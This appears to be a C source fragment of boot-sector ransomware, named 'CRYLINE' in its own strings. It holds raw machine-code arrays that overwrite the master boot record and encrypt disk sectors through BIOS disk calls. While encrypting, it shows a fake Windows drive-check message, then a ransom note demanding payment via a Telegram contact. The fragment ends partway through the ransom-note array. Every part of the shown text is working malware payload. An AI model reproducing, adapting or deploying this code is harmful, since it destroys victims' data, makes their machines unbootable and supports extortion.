const unsigned char MBR_BANNER[] =
{
		0x89, 0xC8, 0xFA, 0x8E, 0xC0, 0x8E, 0xD8, 0x8E, 0xD0, 0x8E, 0xE0, 0x8E, 0xE8, 0xFB, 0xEB, 0x00,
		0xBB, 0xAA, 0xAA, 0x8E, 0xC3, 0xBB, 0x00, 0x00, 0xB4, 0x03, 0xB0, 0x03, 0xB6, 0x00, 0xB5, 0x00,
		0xB1, 0x04, 0xCD, 0x13, 0x72, 0xEA, 0xEB, 0x00, 0xBB, 0x00, 0x10, 0x8E, 0xC3, 0xBB, 0x00, 0x00,
		0xB4, 0x02, 0xB0, 0x02, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x02, 0xCD, 0x13, 0x72, 0xEA, 0xB8, 0x00,
		0x10, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0xEA, 0x00, 0x00, 0x00, 0x10,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

const unsigned char MBR_ENCRYPTOR[] =
{
		0x89, 0xC8, 0xFA, 0x8E, 0xC0, 0x8E, 0xD8, 0x8E, 0xD0, 0x8E, 0xE0, 0x8E, 0xE8, 0xFB, 0xEB, 0x00,
		0xBB, 0x00, 0x10, 0x8E, 0xC3, 0xBB, 0x00, 0x00, 0xB4, 0x02, 0xB0, 0x02, 0xB6, 0x00, 0xB5, 0x00,
		0xB1, 0x04, 0xCD, 0x13, 0x72, 0xEA, 0xB8, 0x00, 0x10, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E,
		0xE8, 0x8E, 0xD0, 0xEA, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

const unsigned char KERNEL_ENCRYPTOR[] =
{
		0xB4, 0x00, 0xB0, 0x03, 0xCD, 0x10, 0xB4, 0x0B, 0xB7, 0x00, 0xCD, 0x10, 0xEB, 0x00, 0xBE, 0xC9,
		0x00, 0xE8, 0x02, 0x00, 0xEB, 0x14, 0xB4, 0x0E, 0xB7, 0x00, 0xB3, 0x07, 0x8A, 0x04, 0x3C, 0x00,
		0x74, 0x07, 0xCD, 0x10, 0x83, 0xC6, 0x01, 0xEB, 0xF3, 0xC3, 0xB5, 0x00, 0xB6, 0x00, 0xB1, 0x07,
		0xBB, 0x00, 0x20, 0x8E, 0xC3, 0xBB, 0x00, 0x00, 0xB4, 0x02, 0xB0, 0x80, 0xCD, 0x13, 0xBB, 0xAC,
		0xE8, 0xBE, 0x00, 0x00, 0x26, 0x01, 0x34, 0x26, 0xC0, 0x24, 0x04, 0x89, 0xD8, 0x26, 0xF6, 0x24,
		0x26, 0x01, 0x1C, 0x26, 0xC0, 0x2C, 0x02, 0x26, 0x29, 0x34, 0x89, 0xF0, 0x26, 0xF6, 0x24, 0x26,
		0x01, 0x14, 0x26, 0xD0, 0x24, 0x46, 0x83, 0xFE, 0xFF, 0x75, 0xD9, 0xBB, 0x00, 0x20, 0x8E, 0xC3,
		0xBB, 0x00, 0x00, 0xB4, 0x03, 0xB0, 0x80, 0xCD, 0x13, 0xFE, 0xC1, 0x80, 0xF9, 0x3F, 0x75, 0xB0,
		0xFE, 0xC6, 0x80, 0xFE, 0x41, 0x75, 0xA7, 0xBE, 0xF7, 0x02, 0xE8, 0x89, 0xFF, 0xFE, 0xC5, 0x80,
		0xFD, 0x05, 0x75, 0x98, 0xEB, 0x00, 0xBB, 0x00, 0x80, 0x8E, 0xC3, 0xBB, 0x00, 0x00, 0xB4, 0x02,
		0xB0, 0x01, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x06, 0xCD, 0x13, 0x72, 0xEA, 0xEB, 0x00, 0xBB, 0x00,
		0x80, 0x8E, 0xC3, 0xBB, 0x00, 0x00, 0xB4, 0x03, 0xB0, 0x01, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x01,
		0xCD, 0x13, 0x72, 0xEA, 0xEA, 0x00, 0x00, 0xFF, 0xFF, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73,
		0x20, 0x68, 0x61, 0x73, 0x20, 0x65, 0x6E, 0x63, 0x6F, 0x75, 0x6E, 0x74, 0x65, 0x72, 0x65, 0x64,
		0x20, 0x61, 0x20, 0x70, 0x72, 0x6F, 0x62, 0x6C, 0x65, 0x6D, 0x20, 0x63, 0x6F, 0x6D, 0x6D, 0x75,
		0x6E, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x61, 0x20,
		0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x20, 0x63, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x65, 0x64,
		0x20, 0x74, 0x6F, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65,
		0x72, 0x2E, 0x20, 0x0A, 0x0D, 0x54, 0x68, 0x69, 0x73, 0x20, 0x65, 0x72, 0x72, 0x6F, 0x72, 0x20,
		0x63, 0x61, 0x6E, 0x20, 0x62, 0x65, 0x20, 0x63, 0x61, 0x75, 0x73, 0x65, 0x64, 0x20, 0x62, 0x79,
		0x20, 0x75, 0x6E, 0x70, 0x6C, 0x75, 0x67, 0x67, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x20, 0x72, 0x65,
		0x6D, 0x6F, 0x76, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x73, 0x74, 0x6F, 0x72, 0x61, 0x67, 0x65, 0x20,
		0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x20, 0x73, 0x75, 0x63, 0x68, 0x20, 0x61, 0x73, 0x20, 0x61,
		0x6E, 0x20, 0x20, 0x20, 0x20, 0x65, 0x78, 0x74, 0x65, 0x72, 0x6E, 0x61, 0x6C, 0x20, 0x55, 0x53,
		0x42, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x20, 0x77, 0x68, 0x69, 0x6C, 0x65, 0x20, 0x74, 0x68,
		0x65, 0x20, 0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x20, 0x69, 0x73, 0x20, 0x69, 0x6E, 0x20, 0x75,
		0x73, 0x65, 0x2C, 0x20, 0x6F, 0x72, 0x20, 0x62, 0x79, 0x20, 0x66, 0x61, 0x75, 0x6C, 0x74, 0x79,
		0x20, 0x68, 0x61, 0x72, 0x64, 0x77, 0x61, 0x72, 0x65, 0x20, 0x73, 0x75, 0x63, 0x68, 0x20, 0x61,
		0x73, 0x20, 0x61, 0x20, 0x20, 0x68, 0x61, 0x72, 0x64, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x20,
		0x6F, 0x72, 0x20, 0x43, 0x44, 0x2D, 0x52, 0x4F, 0x4D, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x20,
		0x74, 0x68, 0x61, 0x74, 0x20, 0x69, 0x73, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x69, 0x6E, 0x67, 0x2E,
		0x20, 0x59, 0x6F, 0x75, 0x20, 0x6D, 0x61, 0x79, 0x20, 0x63, 0x61, 0x6E, 0x63, 0x65, 0x6C, 0x20,
		0x74, 0x68, 0x65, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x20, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x2C,
		0x20, 0x62, 0x75, 0x74, 0x20, 0x69, 0x74, 0x20, 0x69, 0x73, 0x20, 0x73, 0x74, 0x72, 0x6F, 0x6E,
		0x67, 0x6C, 0x79, 0x20, 0x72, 0x65, 0x63, 0x6F, 0x6D, 0x6D, 0x65, 0x6E, 0x64, 0x65, 0x64, 0x20,
		0x74, 0x68, 0x61, 0x74, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x69, 0x6E, 0x75,
		0x65, 0x2E, 0x20, 0x0A, 0x0D, 0x20, 0x0A, 0x0D, 0x49, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63,
		0x6F, 0x6E, 0x74, 0x69, 0x6E, 0x75, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x63, 0x65, 0x69,
		0x76, 0x65, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x65, 0x72, 0x72,
		0x6F, 0x72, 0x20, 0x6D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x2C, 0x20, 0x77, 0x61, 0x69, 0x74,
		0x20, 0x66, 0x6F, 0x72, 0x20, 0x74, 0x68, 0x65, 0x20, 0x68, 0x61, 0x72, 0x64, 0x20, 0x64, 0x72,
		0x69, 0x76, 0x65, 0x20, 0x20, 0x20, 0x20, 0x20, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x74, 0x6F,
		0x20, 0x66, 0x69, 0x6E, 0x69, 0x73, 0x68, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x63, 0x6F, 0x6E, 0x74,
		0x61, 0x63, 0x74, 0x20, 0x74, 0x68, 0x65, 0x20, 0x68, 0x61, 0x72, 0x64, 0x77, 0x61, 0x72, 0x65,
		0x20, 0x6D, 0x61, 0x6E, 0x75, 0x66, 0x61, 0x63, 0x74, 0x75, 0x72, 0x65, 0x72, 0x2E, 0x0A, 0x0D,
		0x20, 0x0A, 0x0D, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20,
		0x6E, 0x6F, 0x77, 0x20, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x74, 0x68, 0x65, 0x20, 0x64, 0x72,
		0x69, 0x76, 0x65, 0x2E, 0x2E, 0x2E, 0x00, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char KERNEL_BANNER[] =
{
		0xB4, 0x00, 0xB0, 0x03, 0xCD, 0x10, 0xB4, 0x0B, 0xB7, 0x00, 0xB3, 0x04, 0xCD, 0x10, 0xEB, 0x00,
		0xBE, 0x66, 0x00, 0xE8, 0x3C, 0x00, 0xBE, 0xB9, 0x00, 0xE8, 0x36, 0x00, 0xBE, 0x02, 0x01, 0xE8,
		0x30, 0x00, 0xBE, 0x55, 0x01, 0xE8, 0x2A, 0x00, 0xEB, 0x00, 0xBE, 0x48, 0x03, 0xE8, 0x22, 0x00,
		0xBF, 0x84, 0x03, 0xB4, 0x00, 0xCD, 0x16, 0xB4, 0x0E, 0x3C, 0x0D, 0x74, 0x07, 0xCD, 0x10, 0x88,
		0x05, 0x47, 0xEB, 0xEF, 0xC6, 0x05, 0x00, 0xA0, 0x84, 0x03, 0xBE, 0x64, 0x03, 0xE8, 0x02, 0x00,
		0xEB, 0xD8, 0xB4, 0x0E, 0xB7, 0x00, 0xB3, 0x07, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x07, 0xCD, 0x10,
		0x83, 0xC6, 0x01, 0xEB, 0xF3, 0xC3, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x0A, 0x0D, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
		0x20, 0x4F, 0x6F, 0x6F, 0x6F, 0x6F, 0x70, 0x73, 0x21, 0x20, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x73,
		0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20,
		0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x43, 0x52, 0x59,
		0x4C, 0x49, 0x4E, 0x45, 0x20, 0x52, 0x41, 0x4E, 0x53, 0x4F, 0x4D, 0x57, 0x41, 0x52, 0x45, 0x0A,
		0x0D, 0x00, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x0A, 0x0D, 0x00, 0x20, 0x54, 0x68, 0x65, 0x20, 0x68, 0x61, 0x72, 0x64, 0x20, 0x64,
		0x72, 0x69, 0x76, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D,
		0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20,
		0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x65, 0x64, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x61,
		0x6E, 0x20, 0x6D, 0x69, 0x6C, 0x69, 0x74, 0x61, 0x72, 0x79, 0x20, 0x67, 0x72, 0x61, 0x64, 0x65,
		0x0A, 0x0D, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x61, 0x6C,
		0x67, 0x6F, 0x72, 0x69, 0x74, 0x68, 0x6D, 0x2E, 0x20, 0x54, 0x68, 0x65, 0x72, 0x65, 0x20, 0x69,
		0x73, 0x20, 0x6E, 0x6F, 0x20, 0x77, 0x61, 0x79, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x73, 0x74,
		0x6F, 0x72, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x64, 0x61, 0x74, 0x61, 0x20, 0x77, 0x69,
		0x74, 0x68, 0x6F, 0x75, 0x74, 0x20, 0x61, 0x20, 0x73, 0x70, 0x65, 0x63, 0x69, 0x61, 0x6C, 0x0A,
		0x0D, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x6B, 0x65, 0x79,
		0x21, 0x20, 0x59, 0x6F, 0x75, 0x20, 0x63, 0x61, 0x6E, 0x20, 0x70, 0x75, 0x72, 0x63, 0x68, 0x61,
		0x73, 0x65, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x69,
		0x6F, 0x6E, 0x20, 0x6B, 0x65, 0x79, 0x20, 0x6F, 0x6E, 0x20, 0x74, 0x68, 0x65, 0x20, 0x54, 0x65,
		0x6C, 0x65, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x70, 0x61, 0x67, 0x65, 0x0A, 0x0D, 0x20, 0x73, 0x68,
		0x6F, 0x77, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x74, 0x68, 0x65, 0x20, 0x6E, 0x65, 0x78, 0x74, 0x20,
		0x73, 0x74, 0x65, 0x70, 0x3A, 0x20, 0x0A, 0x0D, 0x20, 0x0A, 0x0D, 0x20, 0x20, 0x20, 0x31, 0x2E,
		0x20, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x75, 0x70, 0x20, 0x69, 0x6E, 0x20, 0x74, 0x68, 0x65, 0x20,
		0x54, 0x65, 0x6C, 0x65, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x61, 0x74, 0x20, 0x22, 0x68, 0x74, 0x74,
		0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x74, 0x65, 0x6C, 0x65, 0x67, 0x72, 0x61, 0x6D, 0x2E, 0x6F, 0x72,
		0x67, 0x2F, 0x22, 0x2E, 0x20, 0x49, 0x74, 0x20, 0x73, 0x6F, 0x20, 0x65, 0x61, 0x73, 0x79, 0x21,
		0x0A, 0x0D, 0x20, 0x20, 0x20, 0x32, 0x2E, 0x20, 0x57, 0x72, 0x69, 0x74, 0x65, 0x20, 0x74, 0x6F,
		0x20, 0x74, 0x68, 0x65, 0x20, 0x75, 0x73, 0x65, 0x72, 0x20, 0x40, 0x44, 0x61, 0x72, 0x78, 0x69,
		0x73, 0x20, 0x61, 0x62, 0x6F, 0x75, 0x74, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x6E, 0x63,
		0x69, 0x64, 0x65, 0x6E, 0x74, 0x0A, 0x0D, 0x20, 0x20, 0x20, 0x33, 0x2E, 0x20, 0x57, 0x72, 0x69,
		0x74, 0x65, 0x20, 0x74, 0x68, 0x65, 0x20, 0x72, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x20,
		0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x6B, 0x65, 0x79, 0x20, 0x68,
